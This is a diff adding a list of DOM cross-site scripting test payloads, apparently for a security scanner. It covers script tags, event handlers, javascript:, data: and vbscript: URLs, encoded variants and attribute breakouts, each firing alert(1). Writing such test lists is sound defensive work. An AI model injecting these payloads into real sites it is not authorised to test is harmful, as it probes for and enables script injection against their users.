@@ -1,0 +1,47 @@
+# DOM XSS test payloads - designed to trigger JavaScript sinks
+# These payloads test if URL parameters flow into dangerous DOM sinks
+
+# Basic alert payloads for DOM execution
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+
+# Hash-based payloads (for location.hash testing)
+#<script>alert(1)</script>
+#<img src=x onerror=alert(1)>
+
+# JavaScript URL payloads
+javascript:alert(1)
+javascript:void(alert(1))
+
+# Data URL payloads
+data:text/html,<script>alert(1)</script>
+
+# Encoded payloads
+%3Cscript%3Ealert(1)%3C/script%3E
+\x3Cscript\x3Ealert(1)\x3C/script\x3E
+
+# Protocol handlers
+vbscript:alert(1)
+
+# DOM property manipulation
+"-alert(1)-"
+'-alert(1)-'
+\"-alert(1)-\"
+'-alert(1)-'
+
+# Template string payloads
+${alert(1)}
+{{alert(1)}}
+
+# Event handler payloads
+onclick=alert(1)
+onload=alert(1)
+onerror=alert(1)
+onmouseover=alert(1)
+
+# Break out of attributes
+">><script>alert(1)</script>
+'><script>alert(1)</script>
+"autofocus onfocus=alert(1)
+'autofocus onfocus=alert(1)
